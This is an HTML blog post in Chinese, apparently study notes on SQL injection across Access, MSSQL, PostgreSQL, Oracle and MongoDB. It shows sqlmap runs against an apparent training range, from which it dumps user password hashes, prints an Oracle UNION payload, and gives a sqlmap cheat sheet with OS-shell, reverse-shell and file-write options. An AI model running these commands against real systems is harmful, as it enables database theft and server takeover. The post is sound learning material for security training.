        <content type="html"><![CDATA[<h2 id="WEB漏洞-Oracle-MongoDB等注入"><a href="#WEB漏洞-Oracle-MongoDB等注入" class="headerlink" title="WEB漏洞-Oracle,MongoDB等注入"></a><font size="6"><strong>WEB漏洞-Oracle,MongoDB等注入</strong></font></h2><span id="more"></span><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/1.png"></p><h3 id="一、简要学习各种数据库的注入特点"><a href="#一、简要学习各种数据库的注入特点" class="headerlink" title="一、简要学习各种数据库的注入特点"></a><font size="5"><strong>一、简要学习各种数据库的注入特点</strong></font></h3><p>access,mysql, mssql , mongoDB,postgresql, sqlite,oracle,sybase等</p><h4 id="1、access注入"><a href="#1、access注入" class="headerlink" title="1、access注入"></a><font size="4"><strong>1、access注入</strong></font></h4><pre class=" language-bash"><code class="language-bash">Access数据库 表名 列名数据access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，</code></pre><p><strong>access三大攻击手法</strong></p><pre class=" language-bash"><code class="language-bash">1.access注入攻击片段-联合查询法2.access注入攻击片段-逐字猜解法3.工具类的使用注入（推荐）</code></pre><p><strong>Access注入攻击方式</strong><br>主要有：union 注入、http header 注入、偏移注入等</p><h4 id="2、msSQL注入"><a href="#2、msSQL注入" class="headerlink" title="2、msSQL注入"></a><font size="4"><strong>2、msSQL注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p><p>判断数据库类型<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/2.png"><br>判断数据库版本<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/3.png"></p><h4 id="3、postgresql注入"><a href="#3、postgresql注入" class="headerlink" title="3、postgresql注入"></a><font size="4"><strong>3、postgresql注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/KevinGeorge/p/8446874.html">https://www.cnblogs.com/KevinGeorge/p/8446874.html</a></p><p>数据库识别</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1</span>        ___       __H__ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1.4.11#stable&amp;#125;</span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . ||___|_  [(]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ 12:44:22 /2021-06-23/<span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL OR error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL error-based - Parameter replace'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL inline queries'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL stacked queries (heavy query - comment)'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL stacked queries (heavy query)'</span></code></pre><p>查看数据库权限</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3</span>database management system <span class="token function">users</span> privileges:<span class="token punctuation">[</span>*<span class="token punctuation">]</span> postgres <span class="token punctuation">(</span>administrator<span class="token punctuation">)</span> <span class="token punctuation">[</span>2<span class="token punctuation">]</span>:    privilege: createdb    privilege: super┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3</span><span class="token punctuation">[</span>12:56:40<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> current user is DBAcurrent user is DBA: True</code></pre><p>查看当前数据库</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch</span><span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is PostgreSQLback-end DBMS: PostgreSQL<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching current database<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> on PostgreSQL you<span class="token string">'ll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent database (equivalent to schema on PostgreSQL): '</span>public<span class="token string">'[13:12:38] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/219.153.49.228'<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><p>查看数据表</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables</span>Database: public<span class="token punctuation">[</span>2 tables<span class="token punctuation">]</span>+-----------+<span class="token operator">|</span> notice    <span class="token operator">|</span><span class="token operator">|</span> reg_users <span class="token operator">|</span>+-----------+<span class="token punctuation">[</span>13:17:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/219.153.49.228'</span><span class="token punctuation">[</span>13:17:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><p>查看字段</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns</span>Database: publicTable: reg_users<span class="token punctuation">[</span>4 columns<span class="token punctuation">]</span>+----------+---------+<span class="token operator">|</span> Column   <span class="token operator">|</span> Type    <span class="token operator">|</span>+----------+---------+<span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> int4    <span class="token operator">|</span><span class="token operator">|</span> name     <span class="token operator">|</span> varchar <span class="token operator">|</span><span class="token operator">|</span> password <span class="token operator">|</span> varchar <span class="token operator">|</span><span class="token operator">|</span> status   <span class="token operator">|</span> int4    <span class="token operator">|</span>+----------+---------+</code></pre><p>获取数据</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C "name,password" --dump --batch</span><span class="token punctuation">[</span>2 entries<span class="token punctuation">]</span>+--------+---------------------------------------------+<span class="token operator">|</span> name   <span class="token operator">|</span> password                                    <span class="token operator">|</span>+--------+---------------------------------------------+<span class="token operator">|</span> mozhe2 <span class="token operator">|</span> 1c63129ae9db9c60c3e8aa94d3e00495 <span class="token punctuation">(</span>1qaz2wsx<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> mozhe1 <span class="token operator">|</span> aa92e4057b30d003d87b61b1b12ae909            <span class="token operator">|</span>+--------+---------------------------------------------+</code></pre><h4 id="4、Oracle注入"><a href="#4、Oracle注入" class="headerlink" title="4、Oracle注入"></a><font size="4"><strong>4、Oracle注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a><br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/4.png"></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:41644/new_list.php?id=1 --batch</span>Parameter: <span class="token function">id</span> <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id<span class="token operator">=</span>1 AND 2434<span class="token operator">=</span>2434    Type: UNION query    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - 2 columns    Payload: id<span class="token operator">=</span>-4068 UNION ALL SELECT CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>118<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>122<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>112<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>97<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>102<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>67<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>97<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>101<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>110<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>105<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>85<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>72<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>99<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>119<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>73<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>79<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>85<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>76<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>98<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>78<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>114<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>73<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>81<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>115<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>104<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>98<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>120<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>103<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>75<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>104<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>112<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span>,NULL FROM DUAL-- DhFb---<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing Oracle<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> confirming Oracle<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is Oracleback-end DBMS: Oracle<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/219.153.49.228'</span><span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 13:34:35 /2021-06-23/</code></pre><h4 id="5、mongoDB注入"><a href="#5、mongoDB注入" class="headerlink" title="5、mongoDB注入"></a><font size="4"><strong>5、mongoDB注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/wefeng/p/11503102.html">https://www.cnblogs.com/wefeng/p/11503102.html</a><br>SQLmap不能识别MongoDB这里介绍nosqlattack:<a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:47077/new_list.php?id=1 --batch</span><span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> the target URL content is stable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> target URL content is stable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> GET parameter <span class="token string">'id'</span> is dynamic<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be dynamic<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> heuristic <span class="token punctuation">(</span>basic<span class="token punctuation">)</span> <span class="token function">test</span> shows that GET parameter <span class="token string">'id'</span> might not be injectable<span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">for</span> SQL injection on GET parameter <span class="token string">'id'</span><span class="token punctuation">[</span>13:53:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'AND boolean-based blind - WHERE or HAVING clause'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Boolean-based blind - Parameter replace (original value)'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>13:53:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND error-based - WHERE or HAVING clause (XMLType)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span><span class="token punctuation">[</span>13:53:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase stacked queries (comment)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 AND time-based blind'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Microsoft SQL Server/Sybase time-based blind (IF)'</span><span class="token punctuation">[</span>13:53:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Oracle AND time-based blind'</span>it is recommended to perform only basic UNION tests <span class="token keyword">if</span> there is not at least one other <span class="token punctuation">(</span>potential<span class="token punctuation">)</span> technique found. Do you want to reduce the number of requests? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y<span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic UNION query (NULL) - 1 to 10 columns'</span><span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> does not seem to be injectable<span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> all tested parameters <span class="token keyword">do</span> not appear to be injectable. Try to increase values <span class="token keyword">for</span> <span class="token string">'--level'</span>/<span class="token string">'--risk'</span> options <span class="token keyword">if</span> you wish to perform <span class="token function">more</span> tests. If you suspect that there is some kind of protection mechanism involved <span class="token punctuation">(</span>e.g. WAF<span class="token punctuation">)</span> maybe you could try to use option <span class="token string">'--tamper'</span> <span class="token punctuation">(</span>e.g. <span class="token string">'--tamper=space2comment'</span><span class="token punctuation">)</span> and/or switch <span class="token string">'--random-agent'</span><span class="token punctuation">[</span>13:53:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><h3 id="二、SQLmap使用方法"><a href="#二、SQLmap使用方法" class="headerlink" title="二、SQLmap使用方法"></a><font size="5"><strong>二、SQLmap使用方法</strong></font></h3><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/5.png"></p><pre class=" language-bash"><code class="language-bash">基本操作笔记：-u  <span class="token comment" spellcheck="true">#注入点 </span>-f  <span class="token comment" spellcheck="true">#指纹判别数据库类型 </span>-b  <span class="token comment" spellcheck="true">#获取数据库版本信息 </span>-p  <span class="token comment" spellcheck="true">#指定可测试的参数(?page=1&amp;id=2 -p "page,id") </span>-D <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定数据库名 </span>-T <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定表名 </span>-C <span class="token string">""</span>  <span class="token comment" spellcheck="true">#指定字段 </span>-s <span class="token string">""</span>  <span class="token comment" spellcheck="true">#保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) </span>--level<span class="token operator">=</span><span class="token punctuation">(</span>1-5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要执行的测试水平等级，默认为1 </span>--risk<span class="token operator">=</span><span class="token punctuation">(</span>0-3<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#测试执行的风险等级，默认为1 </span>--time-sec<span class="token operator">=</span><span class="token punctuation">(</span>2,5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#延迟响应，默认为5 </span>--data <span class="token comment" spellcheck="true">#通过POST发送数据 </span>--columns        <span class="token comment" spellcheck="true">#列出字段 </span>--current-user   <span class="token comment" spellcheck="true">#获取当前用户名称 </span>--current-db     <span class="token comment" spellcheck="true">#获取当前数据库名称 </span>--users          <span class="token comment" spellcheck="true">#列数据库所有用户 </span>--passwords      <span class="token comment" spellcheck="true">#数据库用户所有密码 </span>--privileges     <span class="token comment" spellcheck="true">#查看用户权限(--privileges -U root) </span>-U               <span class="token comment" spellcheck="true">#指定数据库用户 </span>--dbs            <span class="token comment" spellcheck="true">#列出所有数据库 </span>--tables -D <span class="token string">""</span>   <span class="token comment" spellcheck="true">#列出指定数据库中的表 </span>--columns -T <span class="token string">"user"</span> -D <span class="token string">"mysql"</span>      <span class="token comment" spellcheck="true">#列出mysql数据库中的user表的所有字段 </span>--dump-all            <span class="token comment" spellcheck="true">#列出所有数据库所有表 </span>--exclude-sysdbs      <span class="token comment" spellcheck="true">#只列出用户自己新建的数据库和表 </span>--dump -T <span class="token string">""</span> -D <span class="token string">""</span> -C <span class="token string">""</span>   <span class="token comment" spellcheck="true">#列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span>--dump -T <span class="token string">""</span> -D <span class="token string">""</span> --start 2 --top 4  <span class="token comment" spellcheck="true"># 列出指定数据库的表的2-4字段的数据 </span>--dbms    <span class="token comment" spellcheck="true">#指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span>--os      <span class="token comment" spellcheck="true">#指定系统(Linux,Windows) </span>-v  <span class="token comment" spellcheck="true">#详细的等级(0-6) </span>    0：只显示Python的回溯，错误和关键消息。     1：显示信息和警告消息。     2：显示调试消息。     3：有效载荷注入。     4：显示HTTP请求。     5：显示HTTP响应头。     6：显示HTTP响应页面的内容 --privileges  <span class="token comment" spellcheck="true">#查看权限 </span>--is-dba      <span class="token comment" spellcheck="true">#是否是数据库管理员 </span>--roles       <span class="token comment" spellcheck="true">#枚举数据库用户角色 </span>--udf-inject  <span class="token comment" spellcheck="true">#导入用户自定义函数（获取系统权限） </span>--union-check  <span class="token comment" spellcheck="true">#是否支持union 注入 </span>--union-cols <span class="token comment" spellcheck="true">#union 查询表记录 </span>--union-test <span class="token comment" spellcheck="true">#union 语句测试 </span>--union-use  <span class="token comment" spellcheck="true">#采用union 注入 </span>--union-tech orderby <span class="token comment" spellcheck="true">#union配合order by </span>--data <span class="token string">""</span> <span class="token comment" spellcheck="true">#POST方式提交数据(--data "page=1&amp;id=2") </span>--cookie <span class="token string">"用;号分开"</span>      <span class="token comment" spellcheck="true">#cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) </span>--referer <span class="token string">""</span>     <span class="token comment" spellcheck="true">#使用referer欺骗(--referer "http://www.baidu.com") </span>--user-agent <span class="token string">""</span>  <span class="token comment" spellcheck="true">#自定义user-agent </span>--proxy <span class="token string">"http://127.0.0.1:8118"</span> <span class="token comment" spellcheck="true">#代理注入 </span>--string<span class="token operator">=</span><span class="token string">""</span>    <span class="token comment" spellcheck="true">#指定关键词,字符串匹配. </span>--threads 　　  <span class="token comment" spellcheck="true">#采用多线程(--threads 3) </span>--sql-shell    <span class="token comment" spellcheck="true">#执行指定sql命令 </span>--sql-query    <span class="token comment" spellcheck="true">#执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) </span>--file-read    <span class="token comment" spellcheck="true">#读取指定文件 </span>--file-write   <span class="token comment" spellcheck="true">#写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span>--file-dest    <span class="token comment" spellcheck="true">#要写入的文件绝对路径 </span>--os-cmd<span class="token operator">=</span>id    <span class="token comment" spellcheck="true">#执行系统命令 </span>--os-shell     <span class="token comment" spellcheck="true">#系统交互shell </span>--os-pwn       <span class="token comment" spellcheck="true">#反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span>--msf-path<span class="token operator">=</span>    <span class="token comment" spellcheck="true">#matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span>--os-smbrelay  <span class="token comment" spellcheck="true"># </span>--os-bof       <span class="token comment" spellcheck="true"># </span>--reg-read     <span class="token comment" spellcheck="true">#读取win系统注册表 </span>--priv-esc     <span class="token comment" spellcheck="true"># </span>--time-sec<span class="token operator">=</span>    <span class="token comment" spellcheck="true">#延迟设置 默认--time-sec=5 为5秒 </span>-p <span class="token string">"user-agent"</span> --user-agent <span class="token string">"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"</span>  <span class="token comment" spellcheck="true">#指定user-agent注入 </span>--eta          <span class="token comment" spellcheck="true">#盲注 </span>/pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 common-outputs.txt common-tables.txt      表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt 常用语句 <span class="token keyword">:</span>1./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -f -b --current-user --current-db --users --passwords --dbs -v 0 2./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --passwords -U root --union-use -v 2 3./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --dump -T <span class="token function">users</span> -C username -D userdb --start 2 